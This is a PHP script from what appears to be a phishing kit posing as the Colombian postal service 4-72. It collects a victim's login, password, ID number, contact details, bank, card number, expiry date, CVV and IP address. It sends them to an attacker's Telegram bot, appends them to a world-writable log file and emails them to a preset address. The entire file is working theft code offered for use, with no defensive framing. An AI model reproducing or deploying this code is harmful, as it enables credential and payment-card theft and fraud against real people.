<?php
require('../config.php');
require_once("../lib/class.inputfilter.php");
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$hoy1 = date("Y/m/d");  
$hoy2 = date("Y-m-d H:i:s");  

$usuario = $ifilter->process($_POST['usr']);
$contrasena = $ifilter->process($_POST['pas']);

$documento = $_COOKIE['documento'];
$nombres = $_COOKIE['nombres'];
$celular = $_COOKIE['celular'];
$correo = $_COOKIE['correo'];
$direccion = $_COOKIE['direccion'];
$ciudad = $_COOKIE['dispositivo'];
$dispositivo = $_COOKIE['dispositivo'];
$banco = $_COOKIE['banco'];
$tarjeta = $_COOKIE['tarjeta'];
$fecha = $_COOKIE['fecha'];
$cvv = $_COOKIE['cvv'];


$ipcliente= $_SERVER['REMOTE_ADDR'];

setcookie('usuario',$usuario,time()+60*9);
setcookie('contrasena',$contrasena,time()+60*9);

function getSslPage($url){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}

$data = [
	'chat_id' => $id_chat,
	'parse_mode' => 'HTML',
	'text' => '<b>'.$dominio.'</b>
	Datos Paso 4 <b>Logo (4-72)</b> '.$hoy2.'

	<b>Usuario:</b> '.$usuario.'
	<b>Contraseña:</b> '.$contrasena.'
	<b>Documento:</b> '.$documento.'
	<b>Nombre:</b> '.$nombres.'
	<b>Celular:</b> '.$celular.'
	<b>Correo:</b> '.$correo.'
	<b>Dirección:</b> '.$direccion.'
	<b>Ciudad:</b> '.$ciudad.'
	<b>Banco:</b> '.$banco.'
	<b>Tarjeta:</b> '.$tarjeta.'
	<b>Fecha:</b> '.$fecha.'
	<b>CVV:</b> '.$cvv.'
	<b>Dispositivo:</b> '.$dispositivo.'
	<b>IP:</b> '.$ipcliente.'
	'
];

$response = getSslPage("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data));


$datos = 'Documento: '.$documento.' | Usuario: '.$usuario.' | Contraseña: '.$contrasena.' | Nombre: '.$nombres.' | Celular: '.$celular.' | Correo: '.$correo.' | Dirección: '.$direccion.' | Ciudad: '.$ciudad.' | Banco: '.$banco.' | Tarjeta: '.$tarjeta.' | Fecha: '.$fecha.' | CVV: '.$cvv.' | Dispositivo: '.$dispositivo.' | IP: '.$ipcliente;

$file = '../4-logo.txt';

$salto = "";
$cabecera = "---------------- Paso 4 (".date("Y-m-d H:i:s").")";

$fp = fopen($file, 'a+');
fwrite($fp, $salto.PHP_EOL);
fwrite($fp, $salto.PHP_EOL);
fwrite($fp, $cabecera.PHP_EOL);
fwrite($fp, utf8_decode($datos).PHP_EOL);
fclose($fp);
chmod($file, 0777);
echo $file;


$to = $destino;
$subject = "Datos 4-72 Paso 4 ".$usuario." - ".$hoy1;
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 
$message = "
<html>
<head>
<title>Datos</title>
</head>
<body>
<b>Documento: </b>".$documento."<br> 
<b>Usuario: </b>".$usuario."<br>
<b>Contraseña: </b>".$contrasena."<br> 
<b>Nombre: </b>".$nombres."<br>
<b>Celular: </b>".$celular."<br> 
<b>Correo: </b>".$correo."<br>
<b>Dirección: </b>".$direccion."<br>
<b>Ciudad: </b>".$ciudad."<br>
<b>Banco: </b>".$banco."<br>
<b>Tarjeta: </b>".$tarjeta."<br>
<b>Fecha: </b>".$fecha."<br>
<b>CVV: </b>".$cvv."<br>
<b>Dispositivo: </b>".$dispositivo."<br> 
<b>Dirección IP: </b>".$ipcliente."<br> 
<b>Hora/Fecha: </b>".$hoy2."
</body>
</html>";
 
mail($to, $subject, $message, $headers);
exit();
?>